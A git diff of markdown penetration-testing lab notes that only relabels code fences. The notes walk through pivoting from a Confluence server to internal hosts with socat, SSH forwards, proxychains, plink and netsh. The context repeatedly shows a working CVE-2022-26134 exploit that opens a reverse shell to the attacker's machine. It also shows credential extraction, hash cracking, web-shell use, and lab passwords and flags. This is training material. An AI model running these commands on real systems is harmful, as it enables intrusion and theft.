@@ -156,7 +156,7 @@ We want to use the creds we found on CONFLUENCE01 to connect to PostgresSQL from
 ##### Setting Up the Lab Environment
 
 To gain access to CONFLUENCE01 we have to utilize RCE vuln in the web app to obtain a reverse shell.  We find it is vulnerable to CVE-2022-26134 and refer to a [Rapid7 PoC payload](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that exploits and returns a reverse shell.
-```
+```bash
 curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
 ```
 - We must first understand what the payload is doing.
@@ -182,11 +182,11 @@ The PoC meets our needs, we modify it to point at our lab machine and to return 
  - The Confluence server IP.
  - Bash payload IP and Port.
  - Remove the verbose flag.
-```
+```bash
 curl http://192.168.198.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
 ```
 - We can now start our Netcat listener on our Kali machine.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ nc -nvlp 4444
 listening on [any] 4444 ...
@@ -206,7 +206,7 @@ uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
 - The shell is running with the privs of the Confluence server.
 
 We can now begin to enum CONFLUENCE01, check the network ifaces with `ip addr`.
-```
+```bash
 confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
 ip addr
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
@@ -228,7 +228,7 @@ ip addr
 	- `ens192` with IP `192.168.198.63`
 	- `ens224` with IP `10.4.198.63`
 - Next we check routes with `ip route`
-```
+```bash
 confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
 ip route
 default via 192.168.198.254 dev ens192 proto static 
@@ -237,7 +237,7 @@ default via 192.168.198.254 dev ens192 proto static
 ```
 
 We then find the Confluence config at `/var/atlassian/application-data/confluence/confluence.cfg.xml` and discover some DB creds.
-```
+```bash
 confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
 <sian/application-data/confluence/confluence.cfg.xml   
 <?xml version="1.0" encoding="UTF-8"?>
@@ -276,7 +276,7 @@ As part of enum on CONFLUENCE01, we find Socat installed, which is capable of si
   - Instead of dying after single conn.
  - Then forward all traffic to 5432 on PGDATABASE01 `TCP:10.4.198.215`
 *We'll listen on port 2345 as it's not in the privileged port range (0-1024), which means we don't need elevated privileges to use it.*
-```
+```bash
 confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.198.215:5432
 <cat -ddd TCP-LISTEN:2345,fork TCP:10.4.198.215:5432   
 2023/11/06 15:59:52 socat[4559] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
@@ -293,7 +293,7 @@ confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:234
  - With postgres user account `-U postgres`
 - Enter password when prompted `D@t4basePassw0rd!`
 - Upon conn run the `\l` command to list avail DB.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ psql -h 192.168.198.63 -p 2345 -U postgres
 Password for user postgres: 
@@ -340,7 +340,7 @@ address            |        lower_email_address         |             external_i
   - Pass to `-m` flag.
  - Copy hashes into `hashes.txt` and pass as first positional arg.
  - The pass Kali included `pastcrack.txt` passwd list as final pos arg.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
 hashcat (v6.2.6) starting
@@ -397,7 +397,7 @@ Stopped: Mon Nov  6 08:23:43 2023
 - Kill our original Socat proc and create a new port forward.
  - Listen on TCP port 2222.
  - Forward to TCP port 22 on PGDATABASE01.
-```
+```bash
 confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2222,fork TCP:10.4.198.215:22
 <socat -ddd TCP-LISTEN:2222,fork TCP:10.4.198.215:22   
 2023/11/06 16:33:56 socat[5407] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
@@ -411,7 +411,7 @@ confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:222
 - We can now conn to port 2222 of CONFLUENCE01 as if we conn directly to port 22 of PGDATABASE01.
  - Us the `database_admin` user and password retrieved from Hashcat.
 		- `sqlpass123`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ ssh -o PubKeyAuthentication=no database_admin@192.168.198.63 -p2222
 database_admin@192.168.198.63's password: 
@@ -460,7 +460,7 @@ Socat is not the only way to setup a port forward on Unix like hosts.  Several a
 ###### Exercises
 
 Capstone Exercise: Use the password found in the previous question to create a new port forward on CONFLUENCE01 and gain SSH access to PGDATABASE01 as the database_admin user. What's the value of the flag found in /tmp/socat_flag on PGDATABASE01?
-```
+```bash
 database_admin@pgdatabase01:~$ cat /tmp/socat_flag
 OS{4a06dc0b7935c1dd07544f26356ed1ab}
 ```
@@ -506,7 +506,7 @@ Before setting up the port forward, we need to know which IP address and port we
 In our CONFLUENCE01 shell we make sure we have TTY functionality using Python3 pty module.  We can then SSH into PGDATABASE01 with the `database_admin` creds `sqlpass123`.
 - `python3 -c 'import pty; pty.spawn("/bin/sh")'`
 - `ssh database_admin@10.4.249.215`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ nc -nvlp 4444
 listening on [any] 4444 ...
@@ -554,7 +554,7 @@ database_admin@pgdatabase01:~$
 ```
 - We now have a SSH conn to PGDATABASE01 from CONFLUENCE01, we can start enum.
 - Run `ip addr` to query network ifaces.
-```
+```bash
 database_admin@pgdatabase01:~$ ip addr
 ip addr
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
@@ -573,7 +573,7 @@ ip addr
        valid_lft forever preferred_lft forever
 ```
 - The run `ip route` to see what subnets are in the routing table.
-```
+```bash
 database_admin@pgdatabase01:~$ ip route
 ip route
 default via 10.4.249.254 dev ens192 proto static 
@@ -588,7 +588,7 @@ default via 10.4.249.254 dev ens192 proto static
   - Pass flag `-z` to check for listening port without sending data.
   - Flag `-v` for verbose.
   - Flag `-w` set to `1` for a lower time-out threshold.
-```
+```bash
 database_admin@pgdatabase01:~$ for i in $(seq 1 254); do nc -zv -w 1 172.16.249.$i 445; done
 <(seq 1 254); do nc -zv -w 1 172.16.249.$i 445; done
 nc: connect to 172.16.249.1 port 445 (tcp) timed out: Operation now in progress
@@ -631,7 +631,7 @@ In this case we want SSH to listen on all ifaces on port 4455 on CONFLUENCE01 `0
  - Log in as `database_admin` with `sqlpass123`
  - Pass the local port forwarding args `-L`
  - Use `-N` to prevent a shell from being opened.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ nc -nvlp 4444
 listening on [any] 4444 ...
@@ -657,7 +657,7 @@ database_admin@10.4.249.215's password: sqlpass123
 *If the SSH connection or the port forwarding fails for some reason, and the output we get from the standard SSH session isn't sufficient to troubleshoot it, we can pass the -v flag to ssh in order to receive debug output.*
 - Since the rev shell from CONFLUENCE01 is now running the SSH session we must catch another shell.
  - We can then confirm the SSH proc we started is listening on 4455 using `ss -ntplu`
-```
+```bash
 confluence@confluence01:/opt/atlassian/confluence/bin$ ss -ntplu
 ss -ntplu
 Netid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process                                                                         
@@ -677,7 +677,7 @@ tcp    LISTEN  0       1         [::ffff:127.0.0.1]:8000                *:*     
  - Username `hr_admin` to the `-U` option.
  - The password we cracked to the `--password` option.
 		- `Welcome1234`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ smbclient -p 4455 -L //192.168.249.63/ -U hr_admin --password=Welcome1234
 
@@ -693,7 +693,7 @@ do_connect: Connection to 192.168.249.63 failed (Error NT_STATUS_CONNECTION_REFU
 Unable to connect with SMB1 -- no workgroup available
 ```
 - We find a share called `scripts` we will likely be able to access.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ smbclient -p 4455 //192.168.249.63/scripts -U hr_admin --password=Welcome1234
 Try "help" to get a list of possible commands.
@@ -711,7 +711,7 @@ getting file \Provisioning.ps1 of size 50 as Provisioning.ps1 (0.2 KiloBytes/sec
 ###### Exercises
 
 Start VM Group 1 and follow the steps in this exercise. What's the flag in Provisioning.ps1?
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ cat Provisioning.ps1 
 ��<# 
@@ -944,7 +944,7 @@ socks5 192.168.249.63 9999
 *Although we specify socks5 in this example, it could also be socks4, since SSH supports both. SOCKS5 supports authentication, IPv6, and User Datagram Protocol (UDP), including DNS. Some SOCKS proxies will only support the SOCKS4 protocol. Make sure you check which version is supported by the SOCKS server when using SOCKS proxies in engagements.*
 
 After edit our conf will look like:
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ tail /etc/proxychains.conf 
 #         * raw: The traffic is simply forwarded to the proxy without modification.
@@ -960,7 +960,7 @@ socks5 192.168.249.63 9999
 ```
 
 We can now use ProxyChains to list the available shares on HRSHARES using smbclient on our Kali machine.  Instead of conn to a port of CONFLUENCE01 we will write our command as if smbclient is conn directly to PGDATABASE01.  We simply prepend `proxychains` to the command, reading the conf, and forcing traffic through our SOCKS proxy.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ proxychains smbclient -L //172.16.249.217/ -U hr_admin --password=Welcome1234
 [proxychains] config file found: /etc/proxychains.conf
@@ -991,7 +991,7 @@ We can escalate and port scan HRSHARES through our proxy using Nnamp.
 - Check top 20 ports `--top-ports=20`
 - Increase verbosity `-vvv`
 We once again prepend with `proxychains`
-```
+```bash
 kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -1047,7 +1047,7 @@ We have successfully create a dynamic port forward and used proxychains to push 
 ###### Exercises
 
 Follow this walkthrough, and scan HRSHARES from the Kali machine using Nmap and Proxychains. What port between 4800 and 4900 is open?
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ proxychains nmap -vvv -sT -p 4800-4900 -Pn 172.16.249.217
 
@@ -1055,7 +1055,7 @@ Follow this walkthrough, and scan HRSHARES from the Kali machine using Nmap and 
 ```
 
 Download the client binary ssh_dynamic_client from http://CONFLUENCE01:8090/exercises/ssh_dynamic_client. Using Proxychains, run it against the port you just found.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ wget http://192.168.249.63:8090/exercises/ssh_dynamic_client -O dyn-port/ssh_dynamic_client
 --2023-11-08 08:26:28--  http://192.168.249.63:8090/exercises/ssh_dynamic_client
@@ -1144,14 +1144,14 @@ CONFLUENCE01 does have an SSH client and we can setup an SSH serve on our Kali m
 
 To set this up in our lab, we first need to enable the SSH server on our Kali machine.
 *Before you start the Kali SSH server, make sure you've set a strong, unique password for the Kali user!*
-```
+```bash
 ┌──(operator㉿labhost)-[~/…/IR/DevOps/logging/cloudfront]
 └─$ sudo systemctl start ssh                   
 [sudo] password for operator:
 ```
 
 We can check that the port is open using `ss`.
-```
+```bash
 ┌──(operator㉿labhost)-[~/…/IR/DevOps/logging/cloudfront]
 └─$ sudo ss -ntplu          
 Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                                  
@@ -1175,7 +1175,7 @@ The SSH remote port forward option is `-R` with a similar syntax to local port f
 	- `127.0.0.1:2345`
 - Foward all traffic to PostgresSQL port of PGDATABASE01	.
 	- `192.168.244.63:5432`
-```
+```bash
 ssh -o PubKeyAuthentication=no -N -R 127.0.0.1:2346:10.4.244.215:5432 operator@192.168.45.182
 
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
@@ -1199,7 +1199,7 @@ operator@192.168.45.182's password:
 ```
 
 We can confirm the remote port forward by checking listening port 2345 is open on our Kali lo iface.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ sudo ss -ntplu                                                     
 Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                                  
@@ -1222,7 +1222,7 @@ We can now start probing port 2345 on our lo iface of our Kali machine as if we 
  - Using the DB creds we found on CONFLUENCE01.
 		- `postgres` user `-U`
    - Password `D@t4basePassw0rd!`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ psql -h 127.0.0.1 -p 2346 -U postgres
 Password for user postgres: 
@@ -1250,7 +1250,7 @@ We created an SSH remote port forward to allow us to connect to an internal DB s
 ###### Exercises
 
 Start VM Group 1 and follow the example from this section. What's the value of the flag found in the hr_backup database payroll table?
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ psql -h 127.0.0.1 -p 2346 -U postgres
 Password for user postgres: 
@@ -1283,7 +1283,7 @@ hr_backup=#
 ```
 
 Start VM Group 2. Download the binary at ssh_remote_client from the CONFLUENCE01 web server at http://CONFLUENCE01:8090/exercises/ssh_remote_client. Create an SSH remote port forward on CONFLUENCE01 that allows you to run the binary against port 4444 on PGDATABASE01 from your Kali machine.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/rem-port]
 └─$ curl http://192.168.244.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
                                                                                          
@@ -1329,7 +1329,7 @@ Extending our scenario, we find a Win server, MULTISERVER03 on the DMZ network. 
 The SSH session is initiated from CONFLUENCE01 connecting back to Kali, binding the SOCKS proxy port to our Kali machine on TCP 9998.  Packets sent to that port get pushed through the tunnel and forwarded to anywhere CONFLUENCE01 can route to!
 
 The remote dynamic port forward command is simple, although confusingly uses the `-R` option as remote port forwarding.  The difference is we only pass one socket, the listening socket for the SSH server.  No need to specify IP, it will bind to lo by default.
-```
+```bash
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 
 ssh -o PubKeyAuthentication=no -N -R 9998 operator@192.168.45.182
@@ -1354,7 +1354,7 @@ socks5 127.0.0.1 9998
 ```
 
 Then run Nmap through proxychains.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ proxychains nmap -vvv -sT --top-ports=20 -Pn 192.168.230.64
 [proxychains] config file found: /etc/proxychains.conf
@@ -1404,7 +1404,7 @@ Nmap done: 1 IP address (1 host up) scanned in 106.73 seconds
 ###### Exercises
 
 Follow the steps in this section to set up a remote dynamic port forward from CONFLUENCE01. Scan ports 9000-9100 on MULTISERVER03 through it. Which port is open? (Note: Make sure to scan MULTISERVER03 on its internal interface at 10.4.X.64).
-```
+```bash
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 
 ssh -o PubKeyAuthentication=no -N -R 9996 operator@192.168.45.182
@@ -1413,7 +1413,7 @@ ssh -o PubKeyAuthentication=no -N -R 9996 operator@192.168.45.182
 ```
 
 Capstone Exercise: Download the ssh_remote_dynamic_client binary from the CONFLUENCE01 web server at http://CONFLUENCE01:8090/exercises/ssh_remote_dynamic_client. Run it against the port you just found on MULTISERVER03 through the remote dynamic port forward.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/rdyn-port]
 └─$ curl http://192.168.210.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4445%200%3E%261%27%29.start%28%29%22%29%7D/
 
@@ -1514,7 +1514,7 @@ When we have direct access to an SSH server with a complex internal network behi
 In our lab, we have SSH access to PGDATABASE01 which we can access through a port forward set up on CONFLUENCE01.  Let's observe the capabilities of shuttle.
 
 First, we can set up a port forward in a shell on CONFLUENCE01, listening on port 2222 on the WAN iface and forwarding to port 22 on PGDATABASE01.
-```
+```bash
 curl http://192.168.200.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4445%200%3E%261%27%29.start%28%29%22%29%7D/
 
 python3 -c 'import pty; pty.spawn("/bin/sh")'
@@ -1579,7 +1579,7 @@ We can connect to any SSH server we want, as long as we have creds.  Let's pract
 Use the RDP creds we found earlier to RDP into the server, then use `ssh.exe` to create a remote dynamic port forward conn back to our Kali machine.  We can then use that to interact with Postgres DB on PGDATABASE01.
 
 Make sure the SSH server is running on our Kali machine.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ systemctl status ssh
 ● ssh.service - OpenBSD Secure Shell server
@@ -1597,13 +1597,13 @@ Make sure the SSH server is running on our Kali machine.
 ```
 
 Use `xfreerdp` to conn to the RDP server on MULTISERVER03.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:$VM1
 ```
 
 Once connected, open `cmd.exe` and determine whether SSH is available using `where ssh`.
-```
+```powershell
 C:\Users\rdp_admin>where ssh
 C:\Windows\System32\OpenSSH\ssh.exe
 
@@ -1613,12 +1613,12 @@ OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
 - SSH is on the machine, the version is >7.6 so we can use it for dynamic port forwards.
 
 We can now create the remote dynamic port forward to our Kali machine.
-```
+```bash
 ssh -N -R 9998 operator@192.168.45.182
 ```
 
 We can check the SOCKS proxy port is open on our Kali machine with `ss`.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ sudo ss -ntplu                             
 [sudo] password for operator: 
@@ -1629,7 +1629,7 @@ tcp      LISTEN    0         128              127.0.0.1:9998             0.0.0.0
 ```
 
 Update `/etc/proxychains.conf` to use this socket.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ tail /etc/proxychains.conf
 [ProxyList]
@@ -1645,7 +1645,7 @@ socks5		127.0.0.1 9998
 ```
 
 We can now run `psql` through `proxychains` to connect to PostgresSQL DB as the `postgres` user, pass `D@t4basePassw0rd!`.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
 └─$ proxychains psql -h 10.4.200.215 -U postgres
 [proxychains] config file found: /etc/proxychains.conf
@@ -1678,7 +1678,7 @@ The conn succeeded and we are interacting with the PostgresSQL DB on PGDATABASE0
 ###### Exercises
 
 Log in to MULTISERVER03 with the rdp_admin credentials we found in the Confluence database (rdp_admin:P@ssw0rd!). Enumerate which port forwarding techniques are available, then use the Windows OpenSSH client to create a port forward that allows you to reach port 4141 on PGDATABASE01 from your Kali machine.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-ssh]
 └─$ ./ssh_exe_exercise_client.bin -h    
 prat_server 0.1.0
@@ -1726,7 +1726,7 @@ We can compromise MULTISERVER03 through the web app, drop a web shell, and gain 
  - We use the web shell to dl `nc.exe`
   - Use to send a rev shell back to Kali.
 *MULTISERVER03 is already "pre-compromised" in the lab. At this point, you can browse to /umbraco/forms.aspx on the HTTP server on port 80 on MULTISERVER03. You should see a webshell page, which will let you run arbitrary commands on MULTISERVER03.*
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
 └─$ find / -name nc.exe 2>/dev/null
 /usr/share/windows-resources/binaries/nc.exe
@@ -1752,7 +1752,7 @@ c:\windows\system32\inetsrv>
 ```
 
 Next we want to get Plink on to MULTISERVER03.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
 └─$ find / -name plink.exe 2>/dev/null
 /usr/share/windows-resources/binaries/plink.exe
@@ -1777,7 +1777,7 @@ In this case we will use Plink to setup a remote port forward so we can access t
 *This might log our Kali password somewhere undesirable! If we're in a hostile network, we may wish to create a port-forwarding only user on our Kali machine for remote port forwarding situations.*
 - Limited Kali SSH user `admin`
  - Passwd `faesh0Baeb8oocaV1aoV` .
-```
+```powershell
 C:\Windows\Temp\plink.exe -ssh -l admin -pw faesh0Baeb8oocaV1aoV -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.182
 C:\Windows\Temp\plink.exe -ssh -l admin -pw faesh0Baeb8oocaV1aoV -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.182
 The host key is not cached for this server:
@@ -1800,7 +1800,7 @@ Linux labhost 6.4.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.4.11-1kali1 (202
 *In much the same way that it's not possible to accept the SSH client key cache prompt from a non-TTY shell on Linux, with some very limited shells with Plink on Windows, we also won't be able to respond to this prompt. An easy solution in that case would be to automate the confirmation with cmd.exe /c echo y, piped into the plink.exe command. This will emulate the confirmation that we usually type when prompted. The entire command would be:* `cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7`.
 
 We can confirm that port has opened with `ss`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
 └─$ sudo ss -ntplu                                             
 [sudo] password for operator: 
@@ -1818,7 +1818,7 @@ tcp      LISTEN    0         10                       *:3389                   *
 - Port 9833 has opened on our lo iface.
 
 We can now conn to port 9983 on our Kali lo iface with `xfreerdp` as the `rdp_admin` user.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
 └─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
 ```
@@ -1827,7 +1827,7 @@ We can now conn to port 9983 on our Kali lo iface with `xfreerdp` as the `rdp_ad
 ###### Exercises
 
 Follow the steps in this section to gain an RDP connection to MULTISERVER03. What's the flag found in flag.txt file on the rdp_admin's desktop?
-```
+```powershell
 C:\Users\rdp_admin>cd \Users\rdp_admin\Desktop\
 
 C:\Users\rdp_admin\Desktop>dir
@@ -1861,7 +1861,7 @@ We want to SSH into PGDATABASE01 directly, we need to create a port forward on M
 *The portproxy subcontext of the netsh interface command requires administrative privileges to make any changes. This means that in most cases we will need to take UAC into account. In this example, we're running it in a shell over RDP using an account with administrator privileges, so UAC is not a concern. However, we should bear in mind that UAC may be a stumbling block in other setups.*
 
 To setup the port forward we will RDP directly into MULTISERVER03.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-netsh]
 └─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:$VM1
 ```
@@ -1876,13 +1876,13 @@ netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.234.6
 ```
 
 We can confirm listening port 2222 is active with `netstat`
-```
+```powershell
 C:\Windows\system32>netstat -anp TCP | find "2222"
   TCP    192.168.234.64:2222    0.0.0.0:0              LISTENING
 ```
 
 We can also confirm the port forward by issuing `show all` in `netsh interface portproxy` subcontext.
-```
+```powershell
 C:\Windows\system32>netsh interface portproxy show all
 
 Listen on ipv4:             Connect to ipv4:
@@ -1894,7 +1894,7 @@ Address         Port        Address         Port
 - The port is listening and the port forward is setup.
 
 We still have a problem, if we check port 2222 with nmap we see it is filtered.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-netsh]
 └─$ sudo nmap -sS $VM1 -Pn -n -p 2222                          
 [sudo] password for operator: 
@@ -1922,7 +1922,7 @@ netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP di
 ```
 
 Recheck with nmap.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-netsh]
 └─$ sudo nmap -sS $VM1 -Pn -n -p 2222
 [sudo] password for operator: 
@@ -1937,7 +1937,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
 ```
 - We can now SSH to port 2222 on MULTISERVER03 as if we are connecting to port 22 of PGDATABASE01.
  - Password `sqlpass123`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-netsh]
 └─$ ssh -o PubKeyAuthentication=no database_admin@192.168.234.64 -p2222
 database_admin@192.168.234.64's password: 
@@ -1969,7 +1969,7 @@ database_admin@pgdatabase01:~$
 *Once we're done with the connection, we need to remember to delete the firewall rule we just created.*
 
 We can delete the rule with `netsh advfirewall firewall`
-```
+```powershell
 C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 
 Deleted 1 rule(s).
